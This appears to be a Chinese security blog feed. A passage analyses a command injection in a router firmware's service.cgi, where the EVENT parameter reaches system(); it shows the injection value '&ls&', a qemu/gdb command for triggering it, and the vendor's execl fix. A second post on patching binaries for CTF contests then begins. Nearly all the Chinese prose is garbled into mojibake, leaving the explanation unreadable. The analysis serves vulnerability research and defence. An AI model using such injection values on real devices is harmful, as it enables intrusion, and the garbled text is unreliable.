<p>å½“ cgibin_parse_request å‡½æ•°å®Œæˆäº† HTTP è¯·æ±‚è§£æåŠ¨ä½œï¼Œå¹¶ä¸”æ­£ç¡®çš„è¿”å›ï¼Œservicecgi_main å‡½æ•°ä¼šç»§ç»­ä¸‹ä¸€æ­¥æ“ä½œã€‚</p>
<p>é¦–å…ˆæ£€æŸ¥å½“å‰ç”¨æˆ· session æ˜¯å¦ä¸ºç®¡ç†å‘˜ï¼Œå¯¹åº”å‡½æ•°æ˜¯ sess_ispoweruserï¼Œç”±äºåœ¨æ¨¡æ‹Ÿç¯å¢ƒä¸­ï¼Œè¿™ä¸ªå‡½æ•°æ— æ³•è·å–åˆ° sessionï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ patch æ‰è¿™ä¸ªå‡½æ•°ã€‚èº«ä»½éªŒè¯æˆåŠŸä¹‹åç»§ç»­è§£æ REQUEST_URI çš„å†…å®¹ï¼Œæ¶‰åŠçš„æŒ‡ä»¤æœ‰ä¸‰ä¸ªï¼šEVENTã€ACTIONã€SERVICEã€‚</p>
<p>è§‚å¯Ÿä»£ç å‘ç° EVENT çš„é™åˆ¶æœ€å°‘ï¼Œå½“è§£æåˆ° EVENT çš„æ—¶å€™è·³å‡º if åˆ¤æ–­ï¼Œè¿›å…¥ else æµç¨‹ï¼›</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  __s1 = <span class="string">&quot;event %s &gt; /dev/null&quot;</span>;</span><br><span class="line">  iVar4 = iVar2;</span><br><span class="line">  LAB_0040ac38:</span><br><span class="line">  lxmldbc_system(__s1,iVar4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å…³é”®å‡½æ•°ä¸º lxmldbc_systemï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">lxmldbc_system</span><span class="params">(<span class="type">char</span> *pcParm1,undefined4 uParm2,undefined4 uParm3,undefined4 uParm4)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined4 local_res4;</span><br><span class="line">  undefined4 local_res8;</span><br><span class="line">  undefined4 local_resc;</span><br><span class="line">  <span class="type">char</span> acStack1036 [<span class="number">1028</span>];</span><br><span class="line">  </span><br><span class="line">  local_res4 = uParm2;</span><br><span class="line">  local_res8 = uParm3;</span><br><span class="line">  local_resc = uParm4;</span><br><span class="line">  vsnprintf(acStack1036,<span class="number">0x400</span>,pcParm1,&amp;local_res4);</span><br><span class="line">  system(acStack1036);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ ¹æ®ä¼ å…¥çš„å‚æ•°ï¼Œè¿™ä¸ªå‡½æ•°ç›´æ¥ä½¿ç”¨ vsnprintf å°† â€œevent %s &gt; &#x2F;dev&#x2F;nullâ€ å’Œå’Œç”¨æˆ·ä¼ å…¥çš„ EVENT æ‹¼æ¥ï¼Œå¹¶åˆ©ç”¨ system æ‰§è¡Œã€‚</p>
<p>è¿™é‡Œæ˜¾ç„¶å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œæ³¨å…¥çš„æ ¼å¼å¤§æ¦‚æ˜¯ï¼›</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;Hello&quot;&amp;ls&amp;pwd</span><br></pre></td></tr></table></figure></div>

<p>è¿è¡Œä¸Šé¢çš„å‘½ä»¤å¯ä»¥åŒæ—¶å¾—åˆ°ä¸‰æ¡æŒ‡ä»¤çš„ç»“æœã€‚</p>
<p>å¦‚æœæˆ‘ä»¬æ„é€  EVENT&#x3D;&amp;ls&amp;ï¼Œé‚£ä¹ˆæ‹¼æ¥å‡ºæ¥çš„ç»“æœå°±æ˜¯ event &amp;ls&amp; &gt; &#x2F;dev&#x2F;nullï¼Œä»è€Œå®Œæˆä»»æ„å‘½ä»¤æ‰§è¡Œã€‚</p>
<h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Update(2021-02-24)ï¼šå½“ IDA ä½¿ç”¨åŸç”Ÿ gdb è°ƒè¯•çš„æ—¶å€™ï¼Œä¼šå¼¹å‡ºè­¦å‘Šä¿¡æ¯ï¼Œæç¤ºæˆ‘ä»¬ IDA æ— æ³•è¯»å–æŸäº›å†…å­˜åŒºåŸŸçš„æ•°æ®ï¼Œé€šå¸¸æ¥è¯´è¿™æ˜¯æ­£å¸¸æƒ…å†µï¼Œæƒ³è¦è¯»å–ç›®æ ‡å†…å­˜æ•°æ®çš„è¯å¯ä»¥æ‰‹åŠ¨è®¾ç½®åœ°å€èŒƒå›´ï¼Œå…·ä½“åšæ³•å¤§å®¶å¯è‡ªè¡Œæœç´¢ã€‚</span><br></pre></td></tr></table></figure></div>

<p>æ ¹æ®é€†å‘åˆ†æçš„ç»“æœï¼Œæˆ‘ä»¬éœ€è¦æ‰‹åŠ¨ä¼ å…¥ä¸€äº›å‚æ•°ä»¥é˜²æ­¢ç¨‹åºè‡ªåŠ¨é€€å‡ºã€‚æŒ‰ç…§ç½‘ä¸Šçš„æ•™ç¨‹æ„é€ å¦‚ä¸‹å‘½ä»¤ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chroot . ./qemu -0 &quot;service.cgi&quot; -g 10000 -E REQUEST_METHOD=&quot;POST&quot; -E CONTENT_LENGTH=10 -E REQUEST_URI=&quot;service.cgi?EVENT=%26ls%26&quot;  -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E HTTP_COOKIE=&quot;uid=aaaaa&quot; ./htdocs/cgibin</span><br></pre></td></tr></table></figure></div>

<p>qemu åˆ©ç”¨ -0 ä¼ å…¥ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ»¡è¶³ main å‡½æ•°çš„éœ€æ±‚ï¼Œè¿›å…¥ servicecgi_main å‡½æ•°ã€‚</p>
<p>åˆ©ç”¨ -E é€‰é¡¹ä¼ å…¥è‡ªå®šä¹‰çš„ç¯å¢ƒå˜é‡ï¼Œæ»¡è¶³åˆ¤æ–­ï¼ŒREQUEST_URI ä¸­åŒ…å«å¾…æ³¨å…¥çš„å‘½ä»¤ï¼ˆURL ç¼–ç ï¼‰ã€‚</p>
<p>åœ¨ç»ˆç«¯è¿è¡Œåæ‰“å¼€ gdb-multiarch</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">file ./htdocs/cgibin</span><br><span class="line">target remote 127.0.0.1:10000</span><br></pre></td></tr></table></figure></div>

<p>ä¸¤æ¡å‘½ä»¤è¿æ¥åˆ° cgibin è¿›ç¨‹ä¸Šé¢ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CNVD-2018-01084-3.png"
                     
                ></p>
<p>æŒ‰ç…§ç¨‹åºé€»è¾‘æˆ‘ä»¬åœ¨ 0x0040aad8 ä¸‹æ–­ç‚¹ï¼Œç„¶åè¿è¡Œç¨‹åº</p>
<p>å½“è¿”å› gdb ç•Œé¢çš„æ—¶å€™ v0 å¯èƒ½æ˜¯ -1ï¼Œä»£è¡¨ cgibin_parse_request çš„é€»è¾‘åˆ¤æ–­å¤±è´¥ã€‚ä¸è¦æ…Œï¼Œæˆ‘ä»¬æ‰‹åŠ¨ patch ç¨‹åºé€»è¾‘åˆ°æ­£ç¡®çš„åˆ†æ”¯å³ï¼š0x0040AB20ã€‚è¿™é‡Œå’Œç½‘ä¸Šçš„æ–‡æ¡£ä¸åŒï¼Œæˆ‘çŒœæµ‹æ˜¯ qemu çš„ç¯å¢ƒé—®é¢˜ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">set $pc = 0x40ab20</span><br></pre></td></tr></table></figure></div>

<p>æ¥ä¸‹æ¥æ‰§è¡Œåˆ° sess_ispoweruser å‡½æ•°ï¼Œç¨‹åºä¼šè¿›å…¥ 20 ç§’å·¦å³çš„å‡æ­»çŠ¶æ€.</p>
<p>æ­¤å¤„æˆ‘ä»¬å¯ä»¥æ‰“å¼€ -strace å¯»æ‰¾åŸå› ï¼Œä¿®æ”¹å¯åŠ¨å‘½ä»¤ï¼Œæ·»åŠ  -strace é€‰é¡¹å†æ‰§è¡Œï¼Œåˆ°äº† sess_ispoweruser å‡½æ•°çª—å£ä¼šæ‰“å°ä¸€å †ä¿¡æ¯ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CNVD-2018-01084-4.png"
                     
                ></p>
<p>é—®é¢˜åœ¨äº qemu æ¨¡æ‹Ÿç¯å¢ƒä¸­æ‰¾ä¸åˆ° &#x2F;var&#x2F;session æ–‡ä»¶ï¼Œä½†æ˜¯å‡½æ•°ä¸€ç›´å°è¯•å»è·å– sessionï¼Œå¯¼è‡´ç¨‹åºå¡åœ¨è¿™é‡Œå¾ªç¯ã€‚</p>
<p>å»é™¤ strace é€‰é¡¹ç»§ç»­è°ƒè¯•ï¼Œpatch æ‰ session éªŒè¯å‡½æ•°ï¼Œè½¬ç§»åˆ°æ­£ç¡®åˆ†æ”¯ï¼š0x0040AB58ï¼Œæ¥ç€å°±å¯ä»¥ç›´æ¥åœ¨å­˜åœ¨æ¼æ´çš„å‡½æ•°å¤´éƒ¨ä¸‹æ–­ç‚¹äº†ï¼Œåœ°å€æ˜¯ï¼š00410f14</p>
<p>ç»§ç»­æ‰§è¡Œ gdb æ–­åœ¨ lxmldbc_system å‡½æ•°å¤´éƒ¨ï¼Œå•æ­¥è°ƒè¯•çœ‹åˆ° vsnprintf å‡½æ•°çš„å‡ ä¸ªå‚æ•°ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CNVD-2018-01084-5.png"
                     
                ></p>
<p>æ˜¾ç„¶æ˜¯æŠŠå­—ç¬¦ä¸² â€œ&amp;ls&amp;â€ æ‹¼æ¥åˆ°äº† â€œevent %s &gt; &#x2F;dev&#x2F;nullâ€ ä¸­ï¼Œæ¥åˆ° system å‡½æ•°å†…éƒ¨ï¼Œå‚æ•°ä¸ºï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CNVD-2018-01084-6.png"
                     
                ></p>
<p>å‘½ä»¤æ³¨å…¥æˆåŠŸã€‚</p>
<p>ä½†æ˜¯ä¸è¦é«˜å…´çš„å¤ªæ—©ï¼Œå¦‚æœç»§ç»­æ‰§è¡Œç¨‹åºæœ‰å¾ˆå¤§å¯èƒ½åªä¼šæ‰“å°å‡ºå¦‚ä¸‹ä¿¡æ¯ï¼š</p>
<div class="code-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/xml</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">report</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">result</span>&gt;</span>OK<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">report</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬å·²ç»æ³¨å…¥äº† ls å‘½ä»¤ï¼Œä¸ºä»€ä¹ˆæ²¡æœ‰æ•ˆæœå‘¢ï¼Ÿ</p>
<p>å†æ¬¡æ‰“å¼€ strace(æ³¨æ„è·³è¿‡ sess_ispoweruser å‡½æ•°)</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CNVD-2018-01084-7.png"
                     
                ></p>
<p>è¿™é‡Œæ‰¾åˆ°äº†ç­”æ¡ˆï¼Œexecve ç³»ç»Ÿè°ƒç”¨é”™è¯¯ï¼Œæ˜¾ç¤ºæ‰¾ä¸åˆ°æ–‡ä»¶ã€‚åæ¥åœ¨å¤§ä½¬çš„æ–‡ç« ä¸Šçœ‹åˆ°è¿™æ˜¯ qemu çš„é”…ï¼Œæˆ‘çš„ qemu æ˜¯ç”¨ apt å®‰è£…çš„ï¼Œç‰ˆæœ¬åœ¨ 2.5.0ï¼Œè¿™ä¸ªç‰ˆæœ¬çš„ qemu user æ¨¡å¼æ²¡æœ‰å®ç° execve å‡½æ•°ã€‚éœ€è¦ä¸‹è½½ qemu 2.9 ç‰ˆæœ¬å¹¶ä¸”åŠ ä¸Š -execve å‚æ•°æ‰è¡Œ(è¿™ä¹ˆè¯´æˆ‘ä¸Šä¸€ç¯‡æ¼æ´ä¹Ÿæ˜¯ç”±äº qemu çš„é—®é¢˜æ‰èµ·ä¸æ¥ shell QAQ)ã€‚</p>
<p>å…³äº 2.9 qemu åŠ  patch çš„é—®é¢˜ï¼Œæ²¡æœ‰å¤ªå¤šçš„æ•™ç¨‹ï¼Œä¸è¿‡æˆ‘å‘ç° QEMU 3.0.0 ç‰ˆæœ¬å­˜åœ¨ä¸€ä¸ª -sandbox é€‰é¡¹ï¼Œå†…éƒ¨æœ‰å¦‚ä¸‹æè¿°</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">use &#x27;elevateprivileges&#x27; to allow or deny QEMU process to elevate its privileges by blacklisting all set*uid|gid system calls.</span><br><span class="line">The value &#x27;children&#x27; will deny set*uid|gid system calls for main QEMU process but will allow forks and execves to run unprivileged</span><br></pre></td></tr></table></figure></div>

<p>ä¸çŸ¥é“æ˜¯ä¸æ˜¯å®˜æ–¹æ·»åŠ çš„ execve ç³»ç»Ÿè°ƒç”¨ï¼Ÿ</p>
<p>æœ€åçœ‹ä¸€ä¸‹å®˜æ–¹çš„ä¿®å¤æ‰‹æ®µï¼š</p>
<p>ä¸‹è½½æ¯”è¾ƒæ–°çš„å›ºä»¶(1.03 ä»¥ä¸Š)ï¼Œç”¨ Ghidra æ‰“å¼€ï¼Œç›´æ¥å®šä½åˆ°å­˜åœ¨æ¼æ´çš„å‡½æ•°é™„è¿‘ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CNVD-2018-01084-8.png"
                     
                ></p>
<p>å‘ç°å‡½æ•°çš„å‚æ•°ä¼ é€’å˜æˆäº† æ–‡ä»¶è·¯å¾„ + å‚æ•°å½¢å¼ã€‚è¿›å…¥å‡½æ•°å†…éƒ¨ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CNVD-2018-01084-9.png"
                     
                ></p>
<p>ä¿®å¤æ‰‹æ®µç®€å•ç²—æš´ï¼Œç›´æ¥ fork å‡ºä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼Œç„¶åå…³é—­ stdoutï¼Œåˆ©ç”¨ execl æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>ç”±äº execl çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬å†æ³¨å…¥çš„å‘½ä»¤å°±æ— æ•ˆäº†ã€‚ä¾‹å¦‚ä¸‹é¢ä¸¤ä¸ªç¨‹åºï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;execl test\n&quot;</span>);</span><br><span class="line">        <span class="type">char</span>* var1 = <span class="string">&quot;/bin/ls&quot;</span>;</span><br><span class="line">        <span class="type">char</span>* var2 = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">        <span class="type">char</span>* var3 = <span class="string">&quot;-la&quot;</span>;</span><br><span class="line">        <span class="type">char</span>* var4 = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line">        <span class="type">int</span> ret = execl(var1, var2, var3, var4, (<span class="type">char</span>*)<span class="number">0</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;execl test\n&quot;</span>);</span><br><span class="line">        <span class="type">char</span>* var1 = <span class="string">&quot;/bin/ls&quot;</span>;</span><br><span class="line">        <span class="type">char</span>* var2 = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">        <span class="type">char</span>* var3 = <span class="string">&quot;-la&quot;</span>;</span><br><span class="line">        <span class="type">char</span>* var4 = <span class="string">&quot;/etc/passwd&amp;ls&amp;&quot;</span>;</span><br><span class="line">        <span class="type">int</span> ret = execl(var1, var2, var3, var4, (<span class="type">char</span>*)<span class="number">0</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>å¤§å®¶å¯ä»¥è‡ªè¡Œç¼–è¯‘è¿è¡ŒæŸ¥çœ‹ç»“æœã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>äºŒè¿›åˆ¶æ–‡ä»¶åº”æ€¥ä¿®å¤</title>
    <url>/2019/06/16/binary_patch/</url>
    <content><![CDATA[<h2 id="æ¼æ´ä¿®å¤æ¦‚è¿°"><a href="#æ¼æ´ä¿®å¤æ¦‚è¿°" class="headerlink" title="æ¼æ´ä¿®å¤æ¦‚è¿°"></a>æ¼æ´ä¿®å¤æ¦‚è¿°</h2><p>åœ¨å…·ä½“åˆ†æä¸€ä¸ªæ¼æ´ä¹‹å‰ï¼Œæˆ‘å…ˆå°†æ¼æ´ç®€å•çš„åˆ†ä¸€ä¸‹ç±»ï¼Œæ ¹æ®æ¼æ´ä¿®å¤çš„éš¾åº¦ï¼Œå¯ä»¥æŠŠæ¼æ´åˆ†ä¸ºä»¥ä¸‹å››ç±»</p>
<span id="more"></span>

<ol>
<li>åé—¨å‡½æ•°ã€å±é™©çš„å­—ç¬¦ä¸²(&#x2F;bin&#x2F;sh)ã€è¾“å…¥å‡½æ•°é•¿åº¦æº¢å‡º(ç¡¬ç¼–ç )ç­‰</li>
<li>æ ¼å¼åŒ–å­—ç¬¦ä¸²ç­‰</li>
<li>æŒ‡é’ˆæ‚¬æŒ‚ã€å †æ ˆæº¢å‡º(åŠ¨æ€é•¿åº¦)ç­‰</li>
<li>é€»è¾‘æ¼æ´</li>
</ol>
<p>è¿™å‡ ç±»æ¼æ´åœ¨ CTFã€AWD æ¯”èµ›ä¸­å¾ˆå¸¸è§ï¼Œä¹Ÿæ˜¯äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨çš„ä¸»è¦è€ƒå¯Ÿç‚¹ï¼ŒæŒ‰ç…§ä¸åŒçš„æ¼æ´åˆå¯ä»¥æ€»ç»“å‡ºå‡ ç§ä¿®å¤æ–¹å¼</p>
<ol>
<li>æš´åŠ› nopã€ä¿®æ”¹ç¡¬ç¼–ç æ•°æ®</li>
<li>æ›¿æ¢ GOT è¡¨æ¡ç›®ã€ç¬¦å·è§£æä¿¡æ¯</li>
<li>ç¬¬ä¸‰æ–¹å·¥å…·æ›¿æ¢ç³»ç»Ÿå‡½æ•°ã€æ·»åŠ ä»£ç </li>
<li>æ‰‹åŠ¨æ·»åŠ ä»£ç </li>
</ol>
<p>å®é™…ä¸Šï¼Œæ— è®ºæ˜¯ä½•ç§ä¿®å¤æ‰‹æ®µï¼Œæ— éæ˜¯å¯¹ç¨‹åºçš„ä»£ç è¿›è¡Œæ·»åŠ ã€åˆ é™¤æˆ–è€…ä¿®æ”¹ï¼Œè™½ç„¶æ²¡æœ‰æºä»£ç ï¼Œä½†æ˜¯å¼€å‘è€…ä»¬åˆ¶ä½œå‡ºäº†å¾ˆå¤šå®ç”¨å·¥å…·ï¼Œçµæ´»å®ç”¨è¿™äº›å·¥å…·ï¼Œå°±ç®—æ²¡æœ‰æºä»£ç ä¹Ÿå¯ä»¥å®ç°å¯¹ binary çš„ patchã€‚</p>
<p><strong>Patch çš„æ ¸å¿ƒæ€æƒ³ï¼š</strong>åœ¨ä¸ç ´åç¨‹åºåŸæœ‰åŠŸèƒ½çš„æƒ…å†µä¸‹ï¼ŒåŠ å…¥æˆ–è€…åˆ é™¤éƒ¨åˆ†ä»£ç ï¼Œä¿®å¤ç¨‹åºçš„æ¼æ´ã€‚</p>
<p>åˆ é™¤ä»£ç å®¹æ˜“å®ç°ï¼Œä½†æ˜¯æ’å…¥ä»£ç éš¾åº¦å°±æ¯”è¾ƒé«˜äº†ï¼Œå…·ä½“æˆ‘ä»¬åœ¨ä¸‹é¢è®¨è®ºã€‚</p>
<h2 id="å·¥å…·ç®€ä»‹"><a href="#å·¥å…·ç®€ä»‹" class="headerlink" title="å·¥å…·ç®€ä»‹"></a>å·¥å…·ç®€ä»‹</h2><p>åœ¨ patch äºŒè¿›åˆ¶æ–‡ä»¶æ—¶å‡ ä¸ªå¸¸ç”¨å·¥å…·ï¼š</p>
<ol>
<li>IDA</li>
<li>keypatch</li>
<li>LIEF</li>
</ol>
<p>IDA æ— éœ€å¤šè¨€ï¼Œkeypatch æ˜¯ IDA çš„ä¸€ä¸ªæ’ä»¶ï¼Œé¡¹ç›®åœ°å€ï¼š<a class="link"   href="https://github.com/keystone-engine/keypatch" >https://github.com/keystone-engine/keypatch<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> ï¼Œè™½ç„¶ IDA è‡ªå¸¦äº†ä¸€ä¸ª patch å·¥å…·ï¼Œä½†æ˜¯ keypatch çš„åŠŸèƒ½è¦è¿œè¿œå¼ºäºå®ƒã€‚</p>
<p>LIEF æ˜¯ä¸€ä¸ªæ”¯æŒå¤šä¸ªå¹³å°çš„äºŒè¿›åˆ¶å·¥å…·ï¼Œé€šè¿‡ LIEF å¯ä»¥å®ç°å¯¹ binary çš„ patchã€hookã€ä»¥åŠå¯¼å…¥ã€å¯¼å‡ºå‡½æ•°ç­‰æ“ä½œï¼Œ çµæ´»ä½¿ç”¨èƒ½å¤Ÿè¾¾åˆ°æ„æƒ³ä¸åˆ°çš„æ•ˆæœã€‚</p>
<p>LIEF æœ‰è¯¦ç»†çš„å®˜æ–¹æ•™ç¨‹ä»¥åŠ API æ–‡æ¡£ï¼Œå¤§å®¶å¯ä»¥è‡ªè¡Œäº†è§£ç”¨æ³•ã€‚</p>
<h2 id="patch-å®æˆ˜"><a href="#patch-å®æˆ˜" class="headerlink" title="patch å®æˆ˜"></a>patch å®æˆ˜</h2><p>æœ¬æ–‡ä¼šä»¥å‡ ä¸ªäºŒè¿›åˆ¶ç¨‹åºä¸ºä¾‹ï¼Œæ¼”ç¤ºå¦‚ä½• patch æ¼æ´çš„åŒæ—¶ä¸å¹²æ‰°ç¨‹åºæ­£å¸¸åŠŸèƒ½ã€‚</p>
<p>ç¨‹åºçš„æ¯æ¡æŒ‡ä»¤éƒ½æœ‰ä¸€å®šçš„é•¿åº¦ï¼ŒæŒ‡ä»¤ä¸æŒ‡ä»¤ä¹‹é—´æ²¡æœ‰å¤šä½™å­—èŠ‚ï¼Œå½“ patch ä»£ç æ—¶ï¼Œå¯èƒ½ä¼šé‡åˆ°æ·»åŠ æˆ–åˆ é™¤ä»£ç çš„æƒ…å†µï¼Œåˆ é™¤ä»£ç æ¯”è¾ƒå®¹æ˜“å®ç°ï¼Œç›´æ¥ä½¿ç”¨ nop æŒ‡ä»¤æ›¿ä»£åŸå§‹ä»£ç å³å¯ï¼Œä½†æ˜¯å½“éœ€è¦æ·»åŠ ã€ä¿®æ”¹ä»£ç çš„æ—¶å€™ï¼Œç»å¸¸ä¼šé‡åˆ°å­—èŠ‚æ•°ä¸å¤Ÿç”¨çš„æƒ…å†µï¼Œä¸ºäº†ä¿è¯ç¨‹åºæ­£å¸¸è¿è¡Œï¼Œæˆ‘ä»¬åˆä¸èƒ½ä¿®æ”¹æ‰æ­£å¸¸ä»£ç ï¼Œè¿™æ—¶å°±éœ€è¦å¯»æ‰¾ä¸€ä¸ªåˆé€‚çš„ç©ºé—´æ¥ä¿å­˜ shellcodeï¼Œå¹¶ä¸”è¿™å—ç©ºé—´éœ€è¦å…·æœ‰å¯æ‰§è¡Œæƒé™ã€‚</p>
<p>å¤§éƒ¨åˆ† ELF ç¨‹åºéƒ½æœ‰ä¸€ä¸ª .eh_frame æ®µï¼ŒåŠŸèƒ½æè¿°å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">When gcc generates code that handles exceptions, it produces tables that describe how to unwind the stack. These tables are found in the .eh_frame section. </span><br></pre></td></tr></table></figure></div>

<p>ç®€å•æ¥è®²ï¼Œè¿™ä¸ªæ®µçš„æ˜¯ç¼–è¯‘å™¨è‡ªå·±æ·»åŠ è¿›å»çš„ï¼Œå½“ä»£ç ä¸­åŒ…å«å¼‚å¸¸å¤„ç†æ“ä½œæ—¶å°±ä¼šç”Ÿæˆï¼Œå®ƒçš„ä¸»è¦ä½œç”¨æ—¶æè¿°å¦‚ä½•å¸è½½ stackã€‚</p>
<p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œç¨‹åºæ­£å¸¸è¿è¡Œçš„æ—¶å€™æ˜¯ä¸ä¼šè§¦å‘å¼‚å¸¸å¤„ç†ä»£ç çš„ï¼Œäºæ˜¯è¿™ä¸ªæ®µå°±å¯ä»¥ä½œä¸ºä¿å­˜ patch ä»£ç çš„ç©ºé—´ã€‚</p>
<p>ä¸€ä¸ª binary çš„æ¼æ´é€šå¸¸å‡ºç°åœ¨æŸä¸ªå‡½æ•°è°ƒç”¨å‰åï¼Œä¾‹å¦‚æŒ‡é’ˆæ‚¬æŒ‚æ¼æ´æ˜¯ç”±äº free ä¸€ä¸ª chunk æ²¡æœ‰æ¸…ç©ºå®ƒçš„æŒ‡é’ˆå¯¼è‡´çš„ï¼Œå†å¦‚æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ˜¯å‚æ•°é—®é¢˜å¯¼è‡´çš„ã€‚patch æ¼æ´çš„æ—¶å€™ä¸€ä¸ªæ ¸å¿ƒæ€è·¯æ˜¯ä¿æŒç¨‹åºæ­£å¸¸åŠŸèƒ½çš„åŒæ—¶ï¼ŒåŠ å…¥æ£€æµ‹ã€ä¿®å¤ä»£ç ï¼Œè€Œæœ€é€‚äºå®ç°è¿™ä¸ªæ“ä½œçš„ä½ç½®å°±æ˜¯ call æŒ‡ä»¤ã€‚ç¬¬ä¸€ï¼Œcall æŒ‡ä»¤é•¿åº¦ä¸º 5 ä¸ªå­—èŠ‚ï¼Œç©ºé—´å……è£•ï¼Œç¬¬äºŒï¼Œé€šè¿‡ call è·³è½¬çš„åŠŸèƒ½å¯ä»¥åŠ«æŒç¨‹åºçš„æ§åˆ¶æµåˆ°æˆ‘ä»¬çš„ patch ä»£ç ä¸Šï¼Œå®Œæˆä¿®å¤ä¹‹åå†é€šè¿‡å¼ºåˆ¶è·³è½¬æŒ‡ä»¤å›åˆ°æ­£ç¡®çš„æ§åˆ¶æµï¼Œå¯¹ç¨‹åºçš„ä¿®æ”¹å¾ˆå°ï¼Œç›¸å¯¹äºå¢åŠ ä¸€ä¸ªæ®µæˆ–è€…æ˜¯ libc çš„æ–¹æ³•æ¥è¯´æ›´åŠ ç¨³å®šã€‚</p>
<p><strong>Patch 1:</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20190614185335210.png"
                      alt="image-20190614185335210"
                ></p>
<p>å¾ˆæ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œé€ æˆæ¼æ´çš„ä¸»è¦åŸå› æ˜¯ printf å‡½æ•°å‚æ•°ç”¨æˆ·å¯æ§ã€‚</p>
<p>patch æ ¼å¼åŒ–å­—ç¬¦ä¸²ç±»çš„æ¼æ´æ¯”è¾ƒç®€å•ï¼Œé€šå¸¸ç›´æ¥ä½¿ç”¨ keypatch ä¿®æ”¹ call printf å‰åä»£ç ï¼Œæ»¡è¶³ puts(buf) å³å¯ã€‚</p>
<p>patchå‰ï¼š</p>
